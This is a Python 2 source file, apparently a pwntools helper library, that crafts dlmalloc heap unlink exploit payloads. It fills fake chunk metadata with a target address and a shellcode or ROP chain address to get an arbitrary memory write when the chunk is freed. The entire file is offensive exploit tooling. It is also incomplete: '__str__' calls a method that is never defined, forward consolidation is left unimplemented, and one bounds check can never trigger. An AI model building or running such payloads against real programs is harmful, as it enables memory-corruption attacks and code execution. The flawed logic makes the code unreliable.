
from pwn import *

# TODO support for overwriting using forward consolidation
# TODO support for overwriting using forward consolidation only
# TODO edgecase that metadata's prevsize can be used as size => DONE
# TODO add support for arch 32 and 64   => DONE
# TODO support for overwriting using frontlink method
# TODO what if we can overwrite ONLY the metadata of C

"""
Terminology :
    Block whose metadata is being overwritten and later freed     :    "C"
    Block that is 'before' C(crafted block)                       :    "BEFORE_C"
    Block that is 'after'  C(crafted block)                       :    "AFTER_C"
"""

class HeaplibException(Exception):
    pass

class HeapPayloadCrafter(object):
    def __init__(self, destination, source, **kw):
        """
        destination    :   Address to which `source` must be written out to.
        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
                           must be writable
        destination_2  :   Optional 2nd address to overwrite using forward consolidation.
        """
        self.destination          = destination
        self.source               = source
        self.destination_2        = kw.get("destination_2", None)
        self.source_2             = kw.get("source_2", None)
        self.size                 = kw.get("size", 4)
        self.only_fwd_consol      = kw.get("only_fwd_consol", False)
        self.allocator            = kw.get("allocator", "dlmalloc")
        self.pre_length           = kw.get("pre_length", None)
        self.post_length          = kw.get("post_length", None)
        self.pre_preset           = kw.get("pre_preset", {})
        self.post_preset          = kw.get("post_preset", {})
        self.populating_character = kw.get("populating_character", "*")

    def can_use(self, content, start, length):
        return content[start: start+length] == [self.populating_character] * length

    def populate_content(self, **kw):
        presets = kw.get("presets", None)
        length = kw.get("length", None)

        full_content = [self.populating_character] * length
        for offset in presets:
            content = presets[offset]
            start, end = offset, offset + len(content)

            if start < 0 and start >= length:
                raise HeaplibException("Invalid start offset when populating content")
            elif end > length:
                raise HeaplibException("Invalid end offset(%d) when populating content. Length=%d" % (end, length))

            if not self.can_use(full_content, start, len(content)):
                raise HeaplibException("Offset (%d: %d) is already used" %(start, start+len(content)))
            full_content[start:end] = content

        return full_content

    def find_usable_offset(self, i, full_list, unit_len, values_list, total_length, backward=True):
        while True:
            segment = full_list[i: i+unit_len]
            if len(segment) != unit_len:
                if backward:
                    print "Backward consolidation not possible. Attempting "\
                          "Forward consolidation."
                    self.only_fwd_consol = True
                    return None
                else:
                    raise HeaplibException("Not enough space when performing forward consolidation")
                    return None
            elif self.can_use(segment, 0, len(segment)):
                #PREV_SIZE_C = -(i + (self.size*2))
                contents = flat(values_list)
                full_list[i:i+unit_len] = list(contents)
                assert len(full_list) == total_length
                return i
            i += 1

    def generate_payload(self):
        """
        Generate the payload that will be used to perform arbitrary memory
        writes during unlink.
        """

        prev = self.populate_content(presets=self.pre_preset,  length=self.pre_length)
        post = self.populate_content(presets=self.post_preset, length=self.post_length)
        metadata = ""

        # If we can use backward consolidation to write the exploit
        if not self.only_fwd_consol:
            # Find a contiguous chunk of (self.size*4) bytes that can
            # be used
            i, unit_len = 0, self.size*4
            values_list = [0xfffffff0, 0xfffffff1, self.destination-12, self.source]
            PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
            PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))

        # If we need to use forward consolidation
        if self.only_fwd_consol or (self.destination_2 and self.source_2):
            raise HeaplibException("Forward consolidation not supported yet.")
            pass

        # If no forward consolidation, fill with values that don't cause
        # a crash
        else:
            # Find a contiguous chunk towards the end of `prev` that can be
            # used to place
            i, unit_len = len(prev), self.size*2
            i -= unit_len
            if prev[-4:] == [self.populating_character]*self.size:
                SIZE_C = -4
                after_c = flat(0x41414141)
                prev[-4:] = list(after_c)
            else:
                values_list = [0xfffffff0, 0xfffffff8]
                SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length)
                SIZE_C = -SIZE_C
            SIZE_C &= (-2)   # fffffffe or its equivalent based on arch

        return PREV_SIZE_C, post, SIZE_C, prev

    def __str__(self):
        return ''.join(self.get_exploit())
